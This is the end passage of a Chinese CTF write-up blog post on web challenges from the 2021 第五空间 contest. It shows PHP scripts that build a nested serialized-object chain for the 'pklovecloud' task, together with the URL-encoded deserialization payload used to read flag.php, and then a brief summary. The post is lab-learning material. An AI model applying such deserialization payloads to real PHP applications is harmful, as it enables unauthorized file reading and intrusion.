+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ace();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它的输出值为<code>O%3A3%3A%22ace%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BN%3Bs%3A4%3A%22nova%22%3Bs%3A1%3A%221%22%3Bs%3A7%3A%22neutron%22%3Bs%3A1%3A%221%22%3B%7D</code></p>
+<p>然后把它赋值给<code>docker</code>属性，再往上看<code>acp</code>类中的<code>__toString()</code>会调用<code>echo_name()</code>，然后我们让它调用的是<code>ace</code>类中的<code>echo_name()</code>就行了，构造如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> ace();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span> = <span class="string">&#x27;O%3A3%3A%22ace%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BN%3Bs%3A4%3A%22nova%22%3Bs%3A1%3A%221%22%3Bs%3A7%3A%22neutron%22%3Bs%3A1%3A%221%22%3B%7D&#x27;</span>; </span><br><span class="line">   &#125;  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> acp();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出值为：<code>O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3Bs%3A147%3A%22O%253A3%253A%2522ace%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500cinder%2522%253BN%253Bs%253A4%253A%2522nova%2522%253Bs%253A1%253A%25221%2522%253Bs%253A7%253A%2522neutron%2522%253Bs%253A1%253A%25221%2522%253B%257D%22%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D</code></p>
+<p>直接去打就行了：</p>
+<p><img src="https://i.loli.net/2021/09/17/BXyJIDFWgHwzNuk.png" alt="image.png"></p>
+<p>这样就出来了，终于出现了这个<code>$heat</code>，从头到尾我都不知道它是干啥的，迷惑人的东西</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还有一道sql注入是利用虚表登录上去，那道题我是真不会，太难了，过滤也很恶心，完全是骚操作哈哈哈，等会了再来总结，总体来看这次第五空间的比赛web题出的不算太难，但考点还是挺有趣的，也有一些新的骚操作，害我还是太菜了，争取下次比赛能多出几个题</p>
+
+        
+            <div id="toc-article">
+                
+  <div class="widget-wrap" id="toc-wrap">
+    <h3 class="widget-title"><i class="fa fa-toc"></i> 文章目录</h3>
+    <div class="widget">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%B5%9B-%E9%83%A8%E5%88%86Web"><span class="toc-text">2021第五空间线上赛(部分Web)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-EasyCleanup"><span class="toc-text">1.EasyCleanup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-WebFTP"><span class="toc-text">2.WebFTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-PNG%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E5%99%A8"><span class="toc-text">3.PNG图片转换器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-pklovecloud"><span class="toc-text">4.pklovecloud</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+
+            </div>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://arsenetang.github.io/2021/09/17/WP篇之2021第五空间线上赛(部分Web)/">https://arsenetang.github.io/2021/09/17/WP篇之2021第五空间线上赛(部分Web)/</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
+      
+      
+        
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">older</strong>
+      <div class="article-nav-title">反序列化篇之phar反序列化</div>
+    </a>
+  
+</nav>
+
+      
+      
+        
+
+
+
+
+
+
+
+      
+    </footer>
+  </div>
+</article>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-posts"></i> 最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/09/17/WP%E7%AF%87%E4%B9%8B2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%B5%9B(%E9%83%A8%E5%88%86Web)/">WP篇之2021第五空间线上赛(部分Web)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化篇之phar反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/01/%E5%88%A9%E7%94%A8session.upload_progress%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">利用seesion.upload_progress实现文件包含</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化篇之Session反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bpop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0(%E4%B8%8B)/">反序列化篇之pop链的构造(下)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/RCE/" style="font-size: 16.67px;">RCE</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/php/" style="font-size: 16.67px;">php</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
+    </div>
+  </div>
+
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年09月</a><span class="archive-list-count">12</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-link"></i> 友情链接</h3>
+    <div class="widget">
+      <ul>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example1.com/">site-name1</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example2.com/">site-name2</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example3.com/">site-name3</a>
+        </li>
+      
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+        
+      </div>
+      <a id="totop" href="#top"></a>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <p>
+        <a href="/sitemap.xml">网站地图</a>
+        <span> | </span><a href="/atom.xml">订阅本站</a>
+        <span> | </span><a href="/about/">联系博主</a>
+      </p>
+      
+        <p>
+          <i class="fa fa-visitors"></i>
+          <i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>
+          ，
+          <i class="fa fa-views"></i>
+          <i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>
+        </p>
+      
+      <p>
+        <span>Copyright &copy; 2021 Arsene.Tang.</span>
+        <span>Theme by <a href="https://github.com/chaooo/hexo-theme-BlueLake/" target="_blank">BlueLake.</a></span>
+        
+            <span>Count by <a href="http://busuanzi.ibruce.info/" target="_blank">busuanzi.</a></span>
+        
+        <span>Powered by <a href="https://hexo.io/" target="_blank">Hexo.</a></span>
+      </p>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+<script src="/js/search.json.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+  
+<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+  
+<script src="/localshare/js/social-share.js"></script>
+
+  
+<script src="/localshare/js/qrcode.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</body>
+</html>
